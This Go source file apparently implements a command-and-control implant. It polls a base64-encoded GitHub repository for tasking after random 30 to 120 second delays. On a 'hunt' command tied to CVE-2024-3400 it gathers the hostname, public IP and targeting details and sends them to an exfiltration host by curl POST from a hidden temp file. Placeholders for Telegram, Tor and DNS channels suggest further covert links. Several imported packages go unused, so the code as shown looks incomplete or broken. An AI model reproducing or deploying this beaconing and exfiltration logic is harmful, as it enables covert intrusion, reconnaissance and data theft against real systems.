package main

import (
	"bytes"
	"crypto/aes"
	"crypto/cipher"
	"crypto/rand"
	"crypto/sha256"
	"encoding/base64"
	"encoding/json"
	"fmt"
	"hash/fnv"
	"io"
	"io/ioutil"
	"math/big"
	"net/http"
	"os"
	"os/exec"
	"runtime"
	"strings"
	"time"
)

var (
	C2Key        string
	C2IV         string
	GitHubC2Repo string
	GitHubExfil  string
	TelegramHost string
	TorC2Onion   string
	Phi3ModelURL string
	DNSDomain    string
)

const (
	DELAY_MIN = 30
	DELAY_MAX = 120
)

func randInt(min, max int) int {
	n, _ := rand.Int(rand.Reader, big.NewInt(int64(max-min+1)))
	return int(n.Int64()) + min
}

func httpGET(url string) (string, error) {
	client := &http.Client{Timeout: 10 * time.Second}
	resp, err := client.Get(url)
	if err != nil {
		return "", err
	}
	defer resp.Body.Close()
	body, _ := ioutil.ReadAll(resp.Body)
	return string(body), nil
}

func exfil(data map[string]string) {
	payload, _ := json.Marshal(data)
	tmpfile := os.TempDir() + "/." + randString(8)
	ioutil.WriteFile(tmpfile, payload, 0600)
	go func() {
		cmd := exec.Command("curl", "-s", "-X", "POST", GitHubExfil+"/exfil", "--data-binary", "@"+tmpfile)
		cmd.Run()
		os.Remove(tmpfile)
	}()
}

func randString(n int) string {
	const letters = "abcdefghijklmnopqrstuvwxyz"
	b := make([]byte, n)
	for i := range b {
		num, _ := rand.Int(rand.Reader, big.NewInt(int64(len(letters))))
		b[i] = letters[num.Int64()]
	}
	return string(b)
}

func hostname() string {
	hostname, _ := os.Hostname()
	return hostname
}

func publicIP() string {
	resp, _ := http.Get("https://api.ipify.org")
	if resp != nil {
		defer resp.Body.Close()
		ip, _ := ioutil.ReadAll(resp.Body)
		return string(ip)
	}
	return "unknown"
}

func main() {
	key, _ := base64.StdEncoding.DecodeString(C2Key)
	iv, _ := base64.StdEncoding.DecodeString(C2IV)

	for {
		delay := time.Duration(randInt(DELAY_MIN, DELAY_MAX)) * time.Second
		time.Sleep(delay)

		decodedRepo, _ := base64.StdEncoding.DecodeString(GitHubC2Repo)
		cmdURL := string(decodedRepo) + "/contents/cmd"
		cmdData, err := httpGET(cmdURL)
		if err != nil {
			continue
		}

		var action map[string]interface{}
		json.Unmarshal([]byte(cmdData), &action)

		if action["action"] == "hunt" && strings.Contains(action["vuln"].(string), "CVE-2024-3400") {
			exfil(map[string]string{
				"target": "CVE-2024-3400",
				"status": "scanning",
				"host":   hostname(),
				"ip":     publicIP(),
				"vuln":   "potential",
				"time":   time.Now().UTC().Format(time.RFC3339),
				"geo":    action["geo"].(string),
				"sector": action["sector"].(string),
			})
		}
	}
}
